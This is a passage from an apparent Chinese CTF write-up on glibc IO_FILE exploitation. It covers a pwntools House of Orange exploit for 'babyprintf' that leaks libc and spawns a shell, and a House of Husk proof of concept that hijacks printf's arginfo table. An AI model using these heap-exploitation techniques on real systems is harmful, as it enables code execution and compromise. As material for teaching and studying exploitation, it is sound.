class="string">&quot;result: &quot;</span>);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;too long&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">read_n</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0LL</span>;</span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (<span class="type">int</span>)v0;</span><br><span class="line">    v2 = _IO_getc(stdin);</span><br><span class="line">    v4[v0] = v2;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v0 == <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4[<span class="number">9</span>] != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">strtoul</span>(v4, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">      v1 = <span class="number">9LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v4[v1] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strtoul</span>(v4, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于程序开启了 <code>FORTIFY</code> 机制， 因此在程序编译时所有的 <code>printf()</code> 都被 <code>__printf_chk()</code> 替换掉了，它有如下限制：</p>
<blockquote>
<ul>
<li>包含 <code>%n</code> 的格式化字符串不能位于程序内存中的可写地址。</li>
<li>当使用位置参数时，必须使用范围内的所有参数。所以如果要使用 <code>%7$p</code>，你必须同时使用<code>1</code>,<code>2</code>,<code>3</code>,<code>4</code>,<code>5</code>和<code>6</code>。</li>
</ul>
</blockquote>
<p>先分配 <code>size</code> 大小的空间（不超过0x1000），然后在这里读入字符串，由于使用的是 <code>gets()</code> 函数，存在堆溢出漏洞。然后直接调用<code>__printf_chk()</code> 打印这个字符串，存在栈信息泄露漏洞。</p>
<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><strong>前置脚本</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">is_debug = <span class="literal">True</span></span><br><span class="line">is_local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">global</span> io, elf, libc</span><br><span class="line">    <span class="keyword">if</span> is_local:</span><br><span class="line">        io = process(<span class="string">&#x27;./babyprintf&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&#x27;192.168.152.130&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">    elf = ELF(<span class="string">&quot;./babyprintf&quot;</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">gdbscript=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> is_debug:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prf</span>(<span class="params">size, string</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;size: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;string: &quot;</span>, string)</span><br></pre></td></tr></table></figure></div>

<p><strong>泄露libc</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak_libc</span>():</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    payload  = <span class="string">b&quot;A&quot;</span> * <span class="number">16</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(<span class="number">0xfe1</span>)              <span class="comment"># top chunk header</span></span><br><span class="line">    prf(<span class="number">16</span>, payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(io, &#x27;b *0x400810&#x27;)</span></span><br><span class="line">    prf(<span class="number">0x1000</span>, <span class="string">b&#x27;%p%p%p%p%p%pA&#x27;</span>)                <span class="comment"># _int_free in sysmalloc</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    libc_start_main = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;A&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">12</span>:], <span class="number">16</span>) - <span class="number">241</span></span><br><span class="line">    libc_base = libc_start_main - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;libc_base address: 0x%x&quot;</span> % libc_base)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231023164753642.png"
                      alt="image-20231023164753642"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231023164832351.png"
                      alt="image-20231023164832351"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231023164859904.png"
                      alt="image-20231023164859904"
                ></p>
<p>通过溢出将 <code>top_chunk</code> 的 <code>size</code> 改成 <code>fe1</code>，然后利用申请 <code>0x1000 &gt; 0xfe1</code> 大小的 <code>chunk</code> 将 <code>old_top_chunk</code> 放进 <code>unsorted bin</code> 中，并利用第二次的格式化字符串漏洞泄露 <code>libc</code> 地址。</p>
<p><strong>house of orange</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">house_of_orange</span>():</span><br><span class="line">    io_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">    vtable_addr = libc_base + <span class="number">0x3BE4C0</span>          <span class="comment"># _IO_str_jumps</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;_IO_list_all address: 0x%x&quot;</span> % io_list_all)</span><br><span class="line">    log.info(<span class="string">&quot;system address: 0x%x&quot;</span> % system_addr)</span><br><span class="line">    log.info(<span class="string">&quot;/bin/sh address: 0x%x&quot;</span> % bin_sh_addr)</span><br><span class="line">    log.info(<span class="string">&quot;vtable address: 0x%x&quot;</span> % vtable_addr)</span><br><span class="line"></span><br><span class="line">    _IO_buf_end = (bin_sh_addr - <span class="number">100</span>) // <span class="number">2</span></span><br><span class="line">    stream  = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>)                <span class="comment"># fake header, fp-&gt;_flags, fp-&gt;_IO_read_ptr</span></span><br><span class="line">    stream += p64(<span class="number">0</span>) + p64(io_list_all - <span class="number">0x10</span>)  <span class="comment"># fake bk pointer, fp-&gt;_IO_read_end, fp-&gt;_IO_read_base</span></span><br><span class="line">    stream += p64(<span class="number">0</span>)                            <span class="comment"># fp-&gt;_IO_write_base</span></span><br><span class="line">    stream += p64(<span class="number">0xffffffffffffffff</span>)           <span class="comment"># fp-&gt;_IO_write_ptr</span></span><br><span class="line">    stream += p64(<span class="number">0</span>) * <span class="number">2</span>                        <span class="comment"># fp-&gt;_IO_write_end, fp-&gt;_IO_buf_base</span></span><br><span class="line">    stream += p64(_IO_buf_end)                  <span class="comment"># fp-&gt;_IO_buf_end</span></span><br><span class="line">    stream  = stream.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    stream += p64(<span class="number">0</span>)                            <span class="comment"># fp-&gt;_mode</span></span><br><span class="line"></span><br><span class="line">    payload  = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">    payload += stream</span><br><span class="line">    payload += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    payload += p64(vtable_addr)                 <span class="comment"># _IO_FILE_plus-&gt;vtable # 0xd8</span></span><br><span class="line">    payload += p64(system_addr)                 <span class="comment"># 0xe0</span></span><br><span class="line">    gdb.attach(io, <span class="string">&#x27;b *0x400810&#x27;</span>)</span><br><span class="line">    prf(<span class="number">16</span>, payload)</span><br><span class="line">    io.sendline(<span class="string">b&quot;0x1000&quot;</span>)        <span class="comment"># abort routine</span></span><br><span class="line">    pause()</span><br></pre></td></tr></table></figure></div>

<p>利用堆溢出漏洞构造如下 <code>Heap</code> 与 <code>IO_FILE</code> 结构:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/babyprintf.png"
                      alt="babyprintf"
                ></p>
<p>我们需要利用 <code>abort</code> 调用 <code>_IO_OVERFLOW</code> 所以需要 <code>fp-&gt;_mode</code>为 <code>0</code> 且 <code>fp-&gt;_IO_write_ptr&gt;_fp-&gt;_IO_write_base</code>。然后利用 <code>_IO_str_overflow</code> 函数所以需要绕过以下检查。</p>
<ul>
<li><code>_IO_buf_base = 0</code>，<code>_IO_buf_end = (bin_sh_addr - 100) // 2</code></li>
<li><code>fp-&gt;_flags</code>要不包含<code>_IO_USER_BUF</code>，它被定义为 <code>1</code> ，即 <code>fp-&gt;_flags</code>最低位为 <code>0</code>。</li>
<li><code>_IO_write_ptr = ((bin_sh_addr - 100) // 2) +1</code> ,  <code>_IO_write_base = 0x0</code></li>
<li><code>fp-&gt;_s._allocate_buffer(fp+0xe0)</code> 改为 <code>system</code> 或 <code>one_gadget</code> 地址。</li>
</ul>
<p>利用 <code>house of orange</code> 将 <code>_IO_list_all</code> 的 <code>vtable</code> 指向 <code>_IO_str_jumps</code>，然后利用 <code>abort</code> 调用 <code>_IO_OVERFLOW-&gt;_IO_str_overflow</code> 然后进入我们上面讲的调用流，最后调用 <code>system(&quot;/bin/sh\x00&quot;)</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231023172813846.png"
                      alt="image-20231023172813846"
                ></p>
<p>最后<code>libc</code> 的低 <code>32</code> 位地址为负时，攻击才会成功。</p>
<h1 id="House-of-husk"><a href="#House-of-husk" class="headerlink" title="House of husk"></a>House of husk</h1><p><code>glibc &gt;= 2.23</code></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这种攻击方式主要是利用了<code>printf</code>的一个调用链，应用场景是只能分配较大 <code>chunk</code> 时(超过fastbin)，存在或可以构造出 <code>UAF</code> 漏洞。<code>printf</code> 函数通过检查 <code>__printf_function_table</code> 是否为空，来判断是否有自定义的格式化字符，若为 <code>printf</code> 类格式字符串函数，则会根据格式字符串的种类去执行 <code>__printf_arginfo_table[spec]</code> 处的函数指针。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_function (<span class="type">int</span> spec, printf_function converter, printf_arginfo_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __register_printf_specifier (spec, converter, (printf_arginfo_size_function*) arginfo);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_specifier (<span class="type">int</span> spec, printf_function converter, printf_arginfo_size_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 不在 0~0xff 范围内则调用 __set_errno 并返回 -1</span></span><br><span class="line">  	<span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="type">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      	__set_errno (EINVAL);</span><br><span class="line">      	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> 	<span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  	__libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  	<span class="keyword">if</span> (__printf_function_table == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 若spec为空，程序则会通过calloc分配两个堆地址来存放</span></span><br><span class="line">        <span class="comment">// __printf_arginfo_table和__printf_function_table</span></span><br><span class="line">      	__printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line">		<span class="built_in">calloc</span> (UCHAR_MAX + <span class="number">1</span>, <span class="built_in">sizeof</span> (<span class="type">void</span> *) * <span class="number">2</span>);</span><br><span class="line">      	<span class="keyword">if</span> (__printf_arginfo_table == <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">	  		result = <span class="number">-1</span>;</span><br><span class="line">	  		<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">      	__printf_function_table = (printf_function **)(__printf_arginfo_table + UCHAR_MAX + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>我们可以利用这样一条调用链<code>printf-&gt;vfprintf-&gt;printf_positional-&gt;__parse_one_specmb</code>，通过篡改<code>__printf_arginfo_table</code>和<code>__printf_function_table</code>来进行攻击，可以看到当<code>__printf_function_table</code>非空，将会调用<code>printf_positional</code>函数</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__printf (<span class="type">const</span> <span class="type">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">	va_list arg;</span><br><span class="line">    <span class="type">int</span> done;</span><br><span class="line">    <span class="built_in">va_start</span> (arg, format);</span><br><span class="line">    done = <span class="built_in">vfprintf</span> (stdout, format, arg);</span><br><span class="line">    <span class="built_in">va_end</span> (arg);</span><br><span class="line">    <span class="keyword">return</span> done;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">vfprintf</span> <span class="params">(FILE *s, <span class="type">const</span> CHAR_T *format, va_list ap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">  	<span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    		<span class="keyword">goto</span> do_positional;</span><br><span class="line">	...</span><br><span class="line">do_positional:</span><br><span class="line">	...</span><br><span class="line">  	done = <span class="built_in">printf_positional</span> (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">			    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">			    save_errno, grouping, thousands_sep);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">printf_positional</span> <span class="params">(_IO_FILE *s, <span class="type">const</span> CHAR_T *format, <span class="type">int</span> readonly_format,</span></span></span><br><span class="line"><span class="params"><span class="function">		   va_list ap, va_list *ap_savep, <span class="type">int</span> done, <span class="type">int</span> nspecs_done,</span></span></span><br><span class="line"><span class="params"><span class="function">		   <span class="type">const</span> UCHAR_T *lead_str_end,</span></span></span><br><span class="line"><span class="params"><span class="function">		   CHAR_T *work_buffer, <span class="type">int</span> save_errno,</span></span></span><br><span class="line"><span class="params"><span class="function">		   <span class="type">const</span> <span class="type">char</span> *grouping, THOUSANDS_SEP_T thousands_sep)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">    nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">extern</span> printf_function **__printf_function_table;</span><br><span class="line">	<span class="type">int</span> function_done;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (spec &lt;= UCHAR_MAX</span><br><span class="line">	    &amp;&amp; __printf_function_table != <span class="literal">NULL</span></span><br><span class="line">	    &amp;&amp; __printf_function_table[(<span class="type">size_t</span>) spec] != <span class="literal">NULL</span>)</span><br><span class="line">	 &#123;</span><br><span class="line">	      <span class="type">const</span> <span class="type">void</span> **ptr = <span class="built_in">alloca</span> (specs[nspecs_done].ndata_args</span><br><span class="line">					 * <span class="built_in">sizeof</span> (<span class="type">const</span> <span class="type">void</span> *));</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Fill in an array of pointers to the argument values.  */</span></span><br><span class="line">	      <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; specs[nspecs_done].ndata_args; ++i)</span><br><span class="line">			ptr[i] = &amp;args_value[specs[nspecs_done].data_arg + i];</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Call the function.  */</span></span><br><span class="line">	      function_done = __printf_function_table[(<span class="type">size_t</span>) spec](s, &amp;specs[nspecs_done].info, ptr);</span><br><span class="line">      	  ...</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__parse_one_specmb (<span class="type">const</span> UCHAR_T *format, <span class="type">size_t</span> posn,</span><br><span class="line">		    <span class="keyword">struct</span> printf_spec *spec, <span class="type">size_t</span> *max_ref_arg)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">      || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">      || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">      <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">	 uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">	 the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">      || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">				   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">				    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>泄露 <code>libc</code> 地址。</p>
</li>
<li><p>修改 <code>global_max_fast</code> 为很大的值，可以 <code>large bin attack/unsorted bin attack</code></p>
</li>
<li><p>将 <code>__printf_function_table</code> 或者 <code>__printf_arginfo_table</code> 覆盖为指向写有 <code>one_gadget</code> 的内存的指针。其中 <code>one_gadget</code> 在内存中的偏移对应与之后触发漏洞的 <code>spec</code> 。</p>
</li>
<li><p>如果是利用 <code>__printf_function_table</code> 触发漏洞需要让 <code>__printf_arginfo_table</code> 指向一块内存并且该内存对应 <code>spec</code> 偏移处设为 null ，否则会在 <code>__parse_one_specmb</code> 函数的 if 判断中造成不可预知的错误。</p>
</li>
<li><p>最后调用 <code>printf</code> 触发漏洞获取 <code>shell</code> 。</p>
</li>
</ul>
<p><strong>图解</strong></p>
<p>对于 <code>glibc-2.27</code> 而言：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/husk.png"
                      alt="husk"
                ></p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a><a class="link"   href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/013910" >POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is a Proof-of-Concept for House of Husk</span></span><br><span class="line"><span class="comment"> * This PoC is supposed to be run with libc-2.27.</span></span><br><span class="line"><span class="comment"> gcc poc.c -o poc -no-pie -g</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA       0x3ebc40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_MAX_FAST  0x3ed940</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_FUNCTABLE 0x3f0738</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_ARGINFO   0x3ec870</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ONE_GADGET       0x10a2fc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> libc_base;</span><br><span class="line">    <span class="type">char</span> *a[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>); <span class="comment">// make printf quiet</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* leak libc */</span></span><br><span class="line">    a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* UAF chunk */</span></span><br><span class="line">    a[<span class="number">1</span>] = <span class="built_in">malloc</span>(<span class="built_in">offset2size</span>(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">    a[<span class="number">2</span>] = <span class="built_in">malloc</span>(<span class="built_in">offset2size</span>(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">    a[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* avoid consolidation */</span></span><br><span class="line">    <span class="built_in">free</span>(a[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// unsorted bin 泄露 libc</span></span><br><span class="line">    libc_base = *(<span class="type">unsigned</span> <span class="type">long</span>*)a[<span class="number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc @ 0x%lx\n&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* prepare fake printf arginfo table */</span></span><br><span class="line">    <span class="comment">/* &#x27;X&#x27;-2 mean that prev_size | size */</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">2</span>] + (<span class="string">&#x27;X&#x27;</span> - <span class="number">2</span>) * <span class="number">8</span>) = libc_base + ONE_GADGET;</span><br><span class="line">    <span class="comment">// now __printf_arginfo_table[&#x27;X&#x27;] = one_gadget;</span></span><br><span class="line">    <span class="comment">/*(unsigned long*)(a[1] + (&#x27;X&#x27; - 2) * 8) = libc_base + ONE_GADGET; */</span></span><br><span class="line">    <span class="comment">/* unsorted bin attack */</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">0</span>] + <span class="number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="number">0x10</span>;</span><br><span class="line">    a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">/* overwrite global_max_fast */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite __printf_arginfo_table and __printf_function_table */</span></span><br><span class="line">    <span class="built_in">free</span>(a[<span class="number">1</span>]);<span class="comment">// __printf_function_table =&gt; a heap_addr which is not NULL</span></span><br><span class="line">    <span class="built_in">free</span>(a[<span class="number">2</span>]);<span class="comment">// =&gt; one_gadget</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ignite! */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024120231850.png"
                      alt="image-20231024120231850"
                ></p>
<h2 id="34C3CTF2017-readme-revenge"><a href="#34C3CTF2017-readme-revenge" class="headerlink" title="[34C3CTF2017]readme_revenge"></a><a class="link"   href="https://github.com/firmianay/CTF-All-In-One/tree/master/src/writeup/6.1.13_pwn_34c3ctf2017_readme_revenge" >[34C3CTF2017]readme_revenge <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><h3 id="检查信息-1"><a href="#检查信息-1" class="headerlink" title="检查信息"></a>检查信息</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024113648875.png"
                      alt="image-20231024113648875"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231024113706190.png"
                      alt="image-20231024113706190"
                ></p>
<p>静态编译并且没有去除符号。</p>
<h3 id="试运行-2"><a href="#试运行-2" class="headerlink" title="试运行"></a>试运行</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
